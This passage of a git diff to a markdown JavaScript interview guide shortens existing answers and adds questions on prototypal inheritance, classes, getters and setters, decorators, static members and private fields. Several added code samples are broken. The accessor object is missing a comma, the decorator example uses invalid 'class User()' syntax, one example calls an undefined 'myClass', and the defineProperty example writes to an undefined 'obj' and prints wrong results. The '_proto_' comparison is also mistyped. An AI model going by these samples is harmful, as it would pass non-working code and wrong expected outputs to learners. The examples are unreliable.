-};
-console.log(state.user.score);    // 10 — unchanged
-console.log(newState.user.score); // 20
-
-// ── Immer — write mutating syntax, get immutable result ───────────────────────
-import { produce } from 'immer';
-
-const nextState = produce(state, draft => {
-  draft.user.score = 20;        // looks like mutation
-  draft.user.badges.push('🏆'); // but draft is a Proxy — original is safe
-});
-// state is unchanged; nextState is a new object with structural sharing
-
-// ── Immutable array operations ────────────────────────────────────────────────
-const items = [1, 2, 3, 4, 5];
-
-const withAdded   = [...items, 6];                             // add
-const withRemoved = items.filter((_, i) => i !== 2);           // remove index 2
-const withUpdated = items.map((v, i) => i === 1 ? 99 : v);    // update index 1
-const withInserted = [...items.slice(0, 2), 99, ...items.slice(2)]; // insert at 2
 ```
 
 **Real-World Use Case:**
 
-Redux\'s change-detection mechanism is based on **reference equality** (`===`). React-Redux\'s `useSelector` re-renders a component only when the selected state slice returns a different object reference. This is only reliable if reducers produce new objects on every state change — i.e., immutable updates. Immer (built into Redux Toolkit) uses ES6 `Proxy` to intercept mutations on a `draft` object, compute the minimum set of changed nodes via structural sharing, and return a new immutable tree — achieving both developer ergonomics (write mutations naturally) and performance (only changed subtrees allocate new objects). This is how RTK\'s `createSlice` achieves 60% less boilerplate than hand-written spread reducers.
+React-Redux re-renders a component only when the selected state returns a new reference. Reducers must return new objects on every change — not mutate existing ones. Redux Toolkit\'s Immer library handles this automatically, letting you write mutating-style code while producing immutable updates under the hood.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -11113,12 +11001,608 @@ Redux\'s change-detection mechanism is based on **reference equality** (`===`). 
 
 <br>
 
+## Q. Explain how prototypal inheritance works?
+
+The Prototypal Inheritance is a feature in javascript used to add methods and properties in objects. It is a method by which an object can inherit the properties and methods of another object.
+
+In order to get and set the [[Prototype]] of an object, we use `Object.getPrototypeOf()` and `Object.setPrototypeOf()`. Nowadays, in modern language, it is being set using `__proto__`.
+
+**Syntax:**
+
+```js
+ChildObject.__proto__ = ParentObject
+```
+
+**Example:**
+
+In the given example, there are two objects **ParentUser** and **ChildUser**. The object ChildUser inherits the methods and properties of the object ParentUser and further uses them.
+
+```js
+// Parent Object
+let ParentUser = {
+  talk: true,
+  Canfly() {
+    return "Sorry, Can\'t fly";
+  },
+};
+
+// Child Object
+let ChildUser = {
+  CanCode: true,
+  CanCook() {
+    return "Can\'t say";
+  },
+
+  //  Inheriting the properties and methods of Parent Object
+  __proto__: ParentUser,
+};
+
+// Property of Parent Object
+console.log("Can a User talk?: " + ChildUser.talk);
+
+// Method of ParentUser
+console.log("Can a User fly?: " + ChildUser.Canfly());
+
+// Property of ChildUser
+console.log("Can a User code?: " + ChildUser.CanCode);
+
+// Method of ChildUser
+console.log("Can a User cook?: " + ChildUser.CanCook());
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypal-inheritance-qxp33h?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is the difference between prototype and __proto__ in JavaScript?
+
+**1. Proto**: 
+
+It is an actual object that provides a way inherit to inherit properties from JavaScript with the help of an object which is created with new. Every object with behavior associated has internal property [[prototype]].
+
+**Syntax:**
+
+```js
+Object.__proto__ = value
+```
+
+**Example:**
+
+```js
+function Employee(id, name) {
+  this.id = id;
+  this.name = name;
+}
+const employee = new Employee(1090, "Sarvesh Ghose");
+
+// Object have proto property
+employee
+
+// Also if apply strict equal to check
+// if both point at the same
+// location then it will return true.
+Employee.prototype === employee._proto_ // false
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-proto-sqkxeb?file=/src/index.js)**
+
+**2. Prototype**: 
+
+It is a special object which means it holds shared attributes and behaviors of instances. It is a way to inherit properties from javascript as it is available in every function declaration.
+
+**Syntax:**
+
+```js
+objectTypeName.prototype.SharedPropertyName = value;
+```
+
+**Example:**
+
+```js
+// Constructor function
+function Employee(id, name) {
+  this.id = id;
+  this.name = name;
+}
+
+// Objects
+const employee = new Employee(3325, "Karishma Som");
+
+// Prototype
+Employee.prototype.getName = function () {
+  return this.name;
+};
+
+// Function call using object
+console.log(employee.getName());
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototype-wvh93l?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What are the differences between ES6 class and ES5 function constructors?
+
+Classes are a template for creating objects. They encapsulate data with code to work on that data. Classes in JS are built on prototypes but also have some syntax and semantics that are not shared with ES5 class-like semantics. 
+
+ES6 Classes formalize the common JavaScript pattern of simulating class-like inheritance hierarchies using functions and prototypes. They are effectively simple sugaring over prototype-based OO, offering a convenient declarative form for class patterns which encourage interoperability.
+
+ES6 Class Properties
+
+* Class keyword
+* getter/setter method
+* constructor function
+* extends keyword
+* super keyword
+* static keyword
+
+**Example:** ES5 Function Constructor
+
+```js
+// ES5 Function Constructor
+function Student(name, studentId) {
+  // Call constructor of superclass to initialize superclass-derived members.
+  Person.call(this, name);
+
+  // Initialize subclass\'s own members.
+  this.studentId = studentId;
+}
+
+Student.prototype = Object.create(Person.prototype);
+Student.prototype.constructor = Student;
+```
+
+**Example:** ES6 Class
+
+```js
+// ES6 Class
+class Student extends Person {
+  constructor(name, studentId) {
+    super(name);
+    this.studentId = studentId;
+  }
+}
+```
+
+It\'s much more verbose to use inheritance in ES5 and the ES6 version is easier to understand and remember.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is class expression in es6 class?
+
+A class expression is another way to define a class. Class expressions can be named or unnamed. The name given to a named class expression is local to the class\'s body. However, it can be accessed via the name property.
+
+**Example:**
+
+```js
+// Unnamed Class
+let Rectangle = class {
+  constructor(height, width) {
+    this.height = height;
+    this.width = width;
+  }
+};
+console.log(Rectangle.name); // Rectangle
+
+// Named Class
+let Triangle = class TriangleClass {
+  constructor(base, height) {
+    this.base = base;
+    this.height = height;
+  }
+};
+console.log(Triangle.name); // TriangleClass
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-class-expression-nqbyr2?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is difference between private, public and static variables?
+
+Private variables can be accessed by all the members (functions and variables) of the owner object but not by any other object. Public variables can be accessed by all the members of the owner as well as other objects that can access the owner.
+Static variables are related to a class. They come into existence as soon as a class come into existence.
+
+**Example:**
+
+```js
+// Constructor Function
+function MyClass () {
+ 
+  var privateVariable = "I am private!";  // Private variable 
+  this.publicVariable = "I am public!";  // Public variable 
+
+  this.publicMethod = function () {  // Public Method
+    return privateVariable;
+  };
+}
+
+// Instance method will be available to all instances but only load once in memory 
+MyClass.prototype.publicMethod = function () {    
+  return this.publicVariable;
+};
+
+// Static variable shared by all instances
+MyClass.staticProperty = "I am static!";
+
+var myInstance = new MyClass();
+
+console.log(myClass.publicMethod()); // I am private! 
+console.log(MyClass.staticProperty); // I am static! 
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-variable-scope-rgjsm4?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is difference between Classic Inheritance and Prototypical Inheritance?
+
+**1. Class Inheritance**: 
+
+Instances inherit from classes (like a blueprint — a description of the class), and create sub-class relationships: hierarchical class taxonomies. Instances are typically instantiated via constructor functions with the new keyword. Class inheritance may or may not use the class keyword from ES6.
+
+**2. Prototypal Inheritance**: 
+
+Instances inherit directly from other objects. Instances are typically instantiated via factory functions or Object.create(). Instances may be composed from many different objects, allowing for easy selective inheritance.
+
+**Features**  
+
+* Classes: create tight coupling or hierarchies/taxonomies.
+* Prototypes: mentions of concatenative inheritance, prototype delegation, functional inheritance, object composition.
+* No preference for prototypal inheritance & composition over class inheritance.
+
+The difference between classical inheritance and prototypal inheritance is that classical inheritance is limited to classes inheriting from other classes while prototypal inheritance supports the cloning of any object using an object linking mechanism. A prototype basically acts as a template for other objects, whether they are extending the base object or not.
+
+**Example:**
+
+```js
+function Circle(radius) {
+  this.radius = radius;
+}
+
+Circle.prototype.area = function () {
+  let radius = this.radius;
+  return Math.PI * radius * radius;
+};
+
+Circle.prototype.circumference = function () {
+  return 2 * Math.PI * this.radius;
+};
+
+const circle = new Circle(5);
+
+console.log(circle.area()); // 78.53981633974483
+console.log(circle.circumference()); // 31.41592653589793
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypical-inheritance-iyxh6u?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. How do you create an object with prototype?
+
+The `Object.create()` method is used to create a new object with the specified prototype object and properties. i.e, It uses existing object as the prototype of the newly created object. It returns a new object with the specified prototype object and properties.
+
+**Example:**
+
+```js
+const user = {
+  name: "Jayesh Sahni",
+  printInfo: function () {
+    console.log(`My name is ${this.name}.`);
+  }
+};
+
+const admin = Object.create(user);
+admin.name = "Disha Choudhry"; // Here, "name" is a property set on "admin" but not on "user" object
+admin.printInfo(); // My name is Disha Choudhry
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-object-create-skyznx?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. How to use constructor functions for inheritance in JavaScript?
+
+Let say we have `Person` class which has name, age, salary properties and **incrementSalary()** method.
+
+```js
+// Functions Constructor
+function Person(name, age, salary) {
+  this.name = name;
+  this.age = age;
+  this.salary = salary;
+  this.incrementSalary = function (byValue) {
+    this.salary = this.salary + byValue;
+  };
+}
+```
+
+Now we wish to create Employee class which contains all the properties of Person class and wanted to add some additional properties into Employee class.
+
+```js
+function Employee(company){
+	this.company = company;
+}
+
+// Prototypal Inheritance 
+Employee.prototype = new Person("Sundar Pichai", 24, 5000);
+```
+
+In the example above, **Employee** type inherits from **Person**. It does so by assigning a new instance of `Person` to `Employee` prototype. After that, every instance of `Employee` inherits its properties and methods from `Person`.
+
+```js
+// Prototypal Inheritance 
+Employee.prototype = new Person("Sundar Pichai", 24, 5000);
+
+var employee = new Employee("Google");
+
+console.log(employee instanceof Person); // true
+console.log(employee instanceof Employee); // true
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototypal-inheritance-djtiuh?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is prototype chain?
+
+**Prototype chaining** is used to build new types of objects based on existing ones. It is similar to inheritance in a class based language. The prototype on object instance is available through `Object.getPrototypeOf(object)` or `__proto__` property whereas prototype on constructors function is available through **Object.prototype**.
+
+**Example:**
+
+```js
+function Person(firstName, lastName, age) {
+  this.firstName = firstName;
+  this.lastName = lastName;
+  this.age = age;
+}
+// Prototype chaining
+Person.prototype.getFullName = function () {
+  return this.firstName + " " + this.lastName;
+};
+
+// create an instance of the Person class
+const person = new Person("Vanya", "Dayal", 25);
+
+person.hasOwnProperty("firstName"); // true
+person.hasOwnProperty("getFullName"); // false
+person.getFullName(); // Vanya Dayal
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-prototype-chaining-9fvow6?file=/src/index.js)**
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What are javascript accessors?
+
+ECMAScript 5 introduced javascript object accessors or computed properties through getters and setters. Getters uses `get` keyword whereas Setters uses `set` keyword.
+
+```js
+var user = {
+  firstName: "John",
+  lastName : "Abraham",
+  language : "en",
+  get lang() {
+    return this.language;
+  }
+  set lang(lang) {
+  this.language = lang;
+  }
+};
+
+console.log(user.lang); // getter access lang as en
+user.lang = 'fr';
+console.log(user.lang); // setter used to set lang as fr
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. How do you define property on Object constructor?
+
+The Object.defineProperty() static method is used to define a new property directly on an object, or modifies an existing property on an object, and returns the object. 
+
+```js
+const newObject = {};
+
+Object.defineProperty(newObject, 'newProperty', {
+  value: 100,
+  writable: false
+});
+
+console.log(newObject.newProperty); // 100
+
+newObject.newProperty = 200; // It throws an error in strict mode due to writable setting
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is the difference between get and defineProperty?
+
+Both has similar results until unless you use classes. If you use `get` the property will be defined on the prototype of the object whereas using `Object.defineProperty()` the property will be defined on the instance it is applied to.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What are the advantages of Getters and Setters?
+
+Below are the list of benefits of Getters and Setters,
+
+* They provide simpler syntax
+* They are used for defining computed properties, or accessors in JS.
+* Useful to provide equivalence relation between properties and methods
+* They can provide better data quality
+* Useful for doing things behind the scenes with the encapsulated logic.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Can I add getters and setters using defineProperty method?
+
+Yes, You can use `Object.defineProperty()` method to add Getters and Setters. For example, the below counter object uses increment, decrement, add and substract properties,
+
+```js
+var counterObj = {counter : 0};
+
+// Define getters
+Object.defineProperty(obj, "increment", {
+  get : function () {this.counter++;}
+});
+Object.defineProperty(obj, "decrement", {
+  get : function () {this.counter--;}
+});
+
+// Define setters
+Object.defineProperty(obj, "add", {
+  set : function (value) {this.counter += value;}
+});
+Object.defineProperty(obj, "subtract", {
+  set : function (value) {this.counter -= value;}
+});
+
+obj.add = 10;
+obj.subtract = 5;
+console.log(obj.increment); //6
+console.log(obj.decrement); //5
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is a decorator?
+
+A decorator is an expression that evaluates to a function and that takes the target, name, and decorator descriptor as arguments. Also, it optionally returns a decorator descriptor to install on the target object. 
+
+Let us define admin decorator for user class at design time,
+
+```js
+function admin(isAdmin) {
+  return function(target) {
+      target.isAdmin = isAdmin;
+  }
+}
+
+@admin(true)
+class User() {
+}
+console.log(User.isAdmin); // true
+
+@admin(false)
+class User() {
+}
+console.log(User.isAdmin); // false
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What are private class fields in JavaScript?
+
+Private class fields (ES2022) use the `#` prefix to declare fields that are only accessible from inside the class body. They are a true hard private — not accessible via `obj['#field']` or any workaround.
+
+**Syntax:**
+
+```js
+class ClassName {
+  #privateField = defaultValue;
+  #privateMethod() { ... }
+}
+```
+
+**Example:**
+
+```js
+class BankAccount {
+  #balance;
+  #owner;
+
+  constructor(owner, initialBalance) {
+    this.#owner = owner;
+    this.#balance = initialBalance;
+  }
+
+  deposit(amount) {
+    if (amount > 0) this.#balance += amount;
+  }
+
+  withdraw(amount) {
+    if (amount <= this.#balance) this.#balance -= amount;
+    else throw new Error('Insufficient funds');
+  }
+
+  get info() {
+    return `${this.#owner}: \$${this.#balance}`;
+  }
+}
+
+const acc = new BankAccount('Alice', 1000);
+acc.deposit(500);
+console.log(acc.info); // 'Alice: $1500'
+
+// Private fields are inaccessible outside the class:
+console.log(acc.#balance); // SyntaxError
+```
+
+**Private static fields and methods** are also supported:
+
+```js
+class Counter {
+  static #count = 0;
+
+  constructor() {
+    Counter.#count++;
+  }
+
+  static getCount() {
+    return Counter.#count;
+  }
+}
+
+new Counter();
+new Counter();
+console.log(Counter.getCount()); // 2
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
 ## Q. What is the JavaScript `class` syntax, and how does it map to prototype-based inheritance?
 
 ES6 `class` syntax is **syntactic sugar** over JavaScript\'s existing prototype-based inheritance — it does not introduce a new object model. Under the hood, a class declaration creates a constructor function and assigns methods to its `.prototype`. Understanding this mapping is critical for debugging, performance profiling, and interoperating with pre-ES6 code.
 
+**Example 01:**
+
 ```js
-// ES6 class
+/**
+ * ES6 class
+ */
 class Animal {
   constructor(name) {
     this.name = name;   // instance property
@@ -11128,6 +11612,11 @@ class Animal {
     return `${this.name} makes a sound.`;
   }
 }
+```
+
+**Example 02:** The Prototype Equivalent
+
+```js
 
 // Desugared equivalent (what the engine actually does)
 function AnimalES5(name) {
@@ -11143,27 +11632,7 @@ console.log(a.speak());                          // 'Dog makes a sound.'
 console.log(a.hasOwnProperty('name'));           // true  — instance property
 console.log(a.hasOwnProperty('speak'));          // false — on prototype
 console.log(Object.getPrototypeOf(a) === Animal.prototype); // true
-
-// ── Class is still a function ─────────────────────────────────────────────────
-console.log(typeof Animal); // 'function'
-
-// ── Class declarations are NOT hoisted (TDZ) ─────────────────────────────────
-// const x = new MyClass(); // ❌ ReferenceError
-class MyClass {}
-const x = new MyClass(); // ✅
-
-// ── Class body is always in strict mode ──────────────────────────────────────
-class StrictDemo {
-  test() {
-    // this function body is strict mode automatically
-    // 'with' statement would throw SyntaxError here
-  }
-}
 ```
-
-**Real-World Use Case:**
-
-Node.js\'s built-in `EventEmitter` class (and the HTTP `IncomingMessage`, `ServerResponse` classes) are implemented as prototype chains. When application code extends `EventEmitter` to create a custom event bus (`class OrderService extends EventEmitter {}`), the prototype chain is: `orderService → OrderService.prototype → EventEmitter.prototype → Object.prototype`. Understanding this chain is essential when debugging why a custom `emit` override does not fire — it may have shadowed the inherited method rather than overriding it correctly.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -11171,88 +11640,53 @@ Node.js\'s built-in `EventEmitter` class (and the HTTP `IncomingMessage`, `Serve
 
 ## Q. How does class inheritance work with `extends` and `super`, and what are the rules around `super()` in constructors?
 
-`extends` sets up two prototype chains:
+The `extends` keyword establishes **two separate prototype chains** simultaneously. It links both the instances and the classes themselves.
+
 1. `Child.prototype.__proto__ === Parent.prototype` — instance method inheritance.
 2. `Child.__proto__ === Parent` — static method inheritance.
 
 `super` is used in two contexts:
+
 - **In a constructor**: `super(...args)` calls the parent constructor. In a derived class, `super()` **must** be called before any access to `this`. The engine throws `ReferenceError` if you access `this` before `super()` — this is because the parent constructor is responsible for allocating the `this` object for derived classes.
 - **In a method**: `super.methodName()` calls the parent\'s prototype method, enabling cooperative method overriding.
 
+**Example:**
+
 ```js
+/**
+ * Inheritance
+ */
+
 class Shape {
   constructor(colour) {
     this.colour = colour;
-    this.createdAt = new Date().toISOString();
   }
 
   describe() {
     return `A ${this.colour} shape`;
   }
-
-  static create(colour) {
-    return new this(colour); // `this` here is the class (static context)
-  }
 }
 
 class Circle extends Shape {
   constructor(colour, radius) {
-    super(colour);          // ✅ must call super() before using `this`
-    this.radius = radius;   // safe to access `this` now
+    super(colour); // must call super() before using `this`
+    this.radius = radius;
   }
 
   get area() {
-    return +(Math.PI * this.radius ** 2).toFixed(4);
+    return +(Math.PI * this.radius ** 2).toFixed(2);
   }
 
   describe() {
-    // super.describe() calls Shape.prototype.describe with `this` = this Circle
-    return `${super.describe()}, circle with radius ${this.radius}`;
+    return `${super.describe()}, radius ${this.radius}`;
   }
 }
 
-class ColoredCircle extends Circle {
-  constructor(colour, radius, borderColour) {
-    super(colour, radius);                  // chain: ColoredCircle → Circle → Shape
-    this.borderColour = borderColour;
-  }
-
-  describe() {
-    return `${super.describe()}, bordered in ${this.borderColour}`;
-  }
-}
-
-const cc = new ColoredCircle('red', 5, 'black');
-console.log(cc.describe());
-// 'A red shape, circle with radius 5, bordered in black'
-console.log(cc.area);          // 78.5398
-console.log(cc instanceof Circle); // true
-console.log(cc instanceof Shape);  // true
-
-// ── Static inheritance ─────────────────────────────────────────────────────────
-class Rectangle extends Shape {
-  constructor(colour, w, h) {
-    super(colour);
-    this.width = w; this.height = h;
-  }
-}
-
-const rect = Rectangle.create('blue'); // inherited static method, `this` = Rectangle
-console.log(rect instanceof Rectangle); // true — because `this` was Rectangle
-
-// ── super() before this — ReferenceError ─────────────────────────────────────
-class Bad extends Shape {
-  constructor(colour) {
-    // this.extra = 'x'; // ❌ ReferenceError: Must call super before accessing 'this'
-    super(colour);
-    this.extra = 'x';   // ✅
-  }
-}
+const c = new Circle('red', 5);
+console.log(c.describe()); // 'A red shape, radius 5'
+console.log(c.area);       // 78.54
+console.log(c instanceof Shape); // true
 ```
-
-**Real-World Use Case:**
-
-React class components used `extends React.Component` with `super(props)` in the constructor. Forgetting `super(props)` (or calling `super()` without `props`) caused `this.props` to be `undefined` inside the constructor — a class of bug so common that the React team deprecated class components in favour of functional components with hooks in React 16.8. Modern frameworks like NestJS heavily use class inheritance for service injection, controller base classes, and exception filters, requiring precise understanding of the `super` call chain.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -11260,7 +11694,11 @@ React class components used `extends React.Component` with `super(props)` in the
 
 ## Q. What are static methods and properties, and how do they differ from instance members?
 
-**Static members** (`static` keyword) belong to the **class itself** — they live on the constructor function object, not on `prototype`. They are not accessible on instances. **Instance members** (defined in `constructor` or on `prototype`) belong to each individual instance.
+The primary difference lies in where the data lives and what owns it:
+
+* **Instance methods**: Belong to individual objects created via `new`. Each object gets its own copy of the data.
+
+* **Static methods**: Belong to the **class itself**. There is only one copy shared across the entire application, and you do not need to create an object to use them.
 
 | | Access | Memory | Inherited via |
 |---|---|---|---|
@@ -11268,86 +11706,36 @@ React class components used `extends React.Component` with `super(props)` in the
 | Instance method | `instance.method()` | Shared on `prototype` | `instance.__proto__` |
 | Instance property | `instance.prop` | One copy per instance | Own property |
 
+**Example:**
+
 ```js
-class Database {
-  // ── Static property — shared config ──────────────────────────────────────
-  static #instances = 0;           // private static field (ES2022)
-  static DEFAULT_TIMEOUT = 5_000;
+/**
+ * Instance methods vs static methods
+ */
 
-  // ── Static factory methods ────────────────────────────────────────────────
-  static fromConnectionString(connStr) {
-    const [host, port, name] = connStr.split(':');
-    return new Database({ host, port: +port, name });
+class Counter {
+  static count = 0; // static — shared across all instances
+
+  constructor(name) {
+    this.name = name; // instance — unique per object
+    Counter.count++;
   }
 
-  static getInstance() {
-    if (!Database.#instance) Database.#instance = new Database({});
-    return Database.#instance;
-  }
-  static #instance = null; // private static — singleton pattern
-
-  // ── Instance constructor ──────────────────────────────────────────────────
-  constructor({ host = 'localhost', port = 5432, name = 'app' } = {}) {
-    this.host     = host;
-    this.port     = port;
-    this.dbName   = name;
-    this.#queryCount = 0;
-    Database.#instances++;
-  }
-
-  // ── Private instance field ────────────────────────────────────────────────
-  #queryCount;
-
-  // ── Instance method ───────────────────────────────────────────────────────
-  async query(sql) {
-    this.#queryCount++;
-    // ... execute sql
-    return [];
-  }
-
-  get stats() {
-    return { host: this.host, queries: this.#queryCount };
-  }
-
-  // ── Static utility — no instance needed ──────────────────────────────────
-  static sanitise(input) {
-    return String(input).replace(/'/g, "''");
-  }
-
-  static get instanceCount() {
-    return Database.#instances;
+  static reset() {
+    Counter.count = 0; // access via class name, not `this`
   }
 }
 
-const db1 = new Database({ host: 'db.prod.io', port: 5432, name: 'shop' });
-const db2 = Database.fromConnectionString('db.replica.io:5432:shop_ro');
+const a = new Counter('a');
+const b = new Counter('b');
 
-console.log(Database.instanceCount);  // 2 — static
-console.log(Database.DEFAULT_TIMEOUT); // 5000
-// console.log(db1.instanceCount);    // undefined — statics not on instances
+console.log(Counter.count); // 2 — static, belongs to the class
+console.log(a.name);        // 'a' — instance, belongs to the object
+// console.log(a.count);    // undefined — statics aren't on instances
 
-console.log(Database.sanitise("O'Brien")); // 'O''Brien'
-
-// ── Static inheritance ────────────────────────────────────────────────────────
-class PostgresDatabase extends Database {
-  static DEFAULT_TIMEOUT = 10_000; // override parent static
-
-  static fromEnv() {
-    return new PostgresDatabase({
-      host: process.env.DB_HOST,
-      port: +process.env.DB_PORT,
-      name: process.env.DB_NAME,
-    });
-  }
-}
-
-console.log(PostgresDatabase.DEFAULT_TIMEOUT); // 10000 — own static
-console.log(PostgresDatabase.sanitise('test')); // inherited from Database ✅
+Counter.reset();
+console.log(Counter.count); // 0
 ```
-
-**Real-World Use Case:**
-
-TypeORM and Prisma use static methods extensively: `UserRepository.findOne({ id })`, `UserRepository.create({})`, `UserRepository.count()`. These class-level operations don\'t need an instance because they operate on the table as a whole, not on a single row. NestJS decorators (`@Injectable()`, `@Controller()`) attach metadata to class constructor functions via `Reflect.defineMetadata` — a static-like metadata pattern that enables the DI container to introspect and wire dependencies at startup without instantiating the classes first.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -11355,7 +11743,28 @@ TypeORM and Prisma use static methods extensively: `UserRepository.findOne({ id 
 
 ## Q. What are private class fields (`#`), and how do they differ from closure-based privacy and naming conventions?
 
-ES2022 introduced **true private class fields** using the `#` prefix. These are enforced by the JavaScript engine at the syntax level — accessing `instance.#field` from outside the class is a `SyntaxError`, not just `undefined`. This is fundamentally different from:
+**1. Closure-Based Privacy (The ES5 Workaround)**
+
+Closures provide hard privacy by trapping variables inside a function scope. However, methods must be declared inside the constructor, meaning they are re-created for every instance, increasing memory usage.
+
+**Example:**
+
+```js
+/**
+ * Closure-Based Privacy
+ */
+
+function Backpack() {
+  let items = []; // Hard private variable via closure
+
+  this.addItem = function(item) { items.push(item); };
+  this.getItems = function() { return [...items]; };
+} // Methods cannot be shared on Backpack.prototype
+```
+
+**2. Native Private Fields (The Modern Way)**
+
+ES2022 introduced **true private class fields** using the `#` prefix. These are enforced by the JavaScript engine and methods remain efficiently shared on the prototype. Accessing `instance.#field` from outside the class is a `SyntaxError`, not just `undefined`. This is fundamentally different from:
 
 - **`_` naming convention** (`this._value`) — purely cosmetic, still fully public.
 - **Closure-based privacy** (Module Pattern / WeakMap) — private by scope, but awkward with classes and inheritance.
@@ -11363,74 +11772,40 @@ ES2022 introduced **true private class fields** using the `#` prefix. These are 
 
 | Mechanism | Runtime enforced | Works with `in` operator | Inheritable | Performant |
 |---|---|---|---|---|
-| `#` private field | ✅ | ✅ (`#field in obj`) | ❌ (each class owns its own) | ✅ (V8 optimises as struct fields) |
-| `_` convention | ❌ | N/A | ✅ | ✅ |
-| Closure / WeakMap | ✅ | ❌ | ❌ | Moderate (WeakMap lookup) |
-| TypeScript `private` | ❌ (compile-time only) | N/A | ✅ | ✅ |
+| `#` private field | Yes | Yes (`#field in obj`) | No (each class owns its own) | Yes (V8 optimises as struct fields) |
+| `_` convention | No | N/A | Yes | Yes |
+| Closure / WeakMap | Yes | No | No | Moderate (WeakMap lookup) |
+| TypeScript `private` | No (compile-time only) | N/A | Yes | Yes |
+
+**Example:**
 
 ```js
+/**
+ * Private instance fields
+ */
+
 class BankAccount {
-  // Private instance fields
-  #balance;
-  #owner;
-  #transactions = [];
+  #balance; // private — only accessible inside this class
 
-  // Private static field
-  static #nextId = 1;
-
-  constructor(owner, initialDeposit = 0) {
-    if (initialDeposit < 0) throw new RangeError('Initial deposit cannot be negative');
-    this.#owner   = owner;
-    this.#balance = initialDeposit;
-    this.id       = BankAccount.#nextId++; // public id, private counter
-  }
-
-  // Private method
-  #recordTransaction(type, amount) {
-    this.#transactions.push({ type, amount, ts: Date.now(), balance: this.#balance });
+  constructor(initialBalance) {
+    this.#balance = initialBalance;
   }
 
   deposit(amount) {
-    if (amount <= 0) throw new RangeError('Deposit must be positive');
     this.#balance += amount;
-    this.#recordTransaction('deposit', amount);
-    return this;
   }
 
-  withdraw(amount) {
-    if (amount > this.#balance) throw new Error('Insufficient funds');
-    this.#balance -= amount;
-    this.#recordTransaction('withdrawal', amount);
-    return this;
-  }
-
-  get balance()  { return this.#balance; }
-  get statement() { return [...this.#transactions]; } // defensive copy
-
-  // Ergonomic existence check using `in`
-  static isBankAccount(obj) {
-    return #balance in obj; // true only for genuine BankAccount instances
+  get balance() {
+    return this.#balance;
   }
 }
 
-const acc = new BankAccount('Alice', 1000);
-acc.deposit(500).withdraw(200);
-console.log(acc.balance);        // 1300
-// console.log(acc.#balance);    // ❌ SyntaxError — enforced at parse time
-console.log(acc._balance);       // undefined — not a naming convention field
-
-console.log(BankAccount.isBankAccount(acc));  // true
-console.log(BankAccount.isBankAccount({}));   // false
-
-// ── V8 performance: private fields are struct-like ────────────────────────────
-// V8 treats classes with consistent field shapes as 'hidden classes' (shapes).
-// Private fields declared in the constructor are part of the object\'s shape —
-// accessed via fixed offsets like C struct fields, much faster than Map lookups.
+const acc = new BankAccount(100);
+acc.deposit(50);
+console.log(acc.balance);   // 150
+// console.log(acc.#balance); // SyntaxError — enforced at parse time
+console.log(acc['#balance']); // undefined — not reachable via string key either
 ```
-
-**Real-World Use Case:**
-
-The Web Cryptography API\'s `CryptoKey` objects use engine-level privacy to prevent key material from being extractable in JavaScript. Libraries like `jose` (JSON Object Signing and Encryption) use private class fields to store decoded key bytes — ensuring that even if a bug in application code accidentally logs an instance, the private material is not serialised by `JSON.stringify` (private fields are not enumerable and not accessible externally). This is a security-critical pattern for key management in OAuth 2.0 token signing services.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -11445,6 +11820,8 @@ The Web Cryptography API\'s `CryptoKey` objects use engine-level privacy to prev
 **Map:**  
 
 It is used to associate a key to a value irrespective of the datatype such as strings, numbers, objects etc. To assign values to a map you need to use the set method:
+
+**Example:**
 
 ```js
 const map = new Map();
@@ -11471,6 +11848,8 @@ console.log(map); // {'a' => 50, 3 => 30}
 **WeakMap:**
 
 The WeakMap object is a collection of key/value pairs in which the keys are weakly referenced. In this case, keys must be objects and the values can be arbitrary values. WeakMap accepts only objects but not any primitive values (strings, numbers)
+
+**Example:**
 
 ```js
 // WeakMap()
@@ -12472,7 +12851,16 @@ The `window.localtion.url` property will be helpful to modify the url but it rel
 **Example:**
 
 ```js
-window.history.pushState('newPage', 'Title', '/newPage.html');
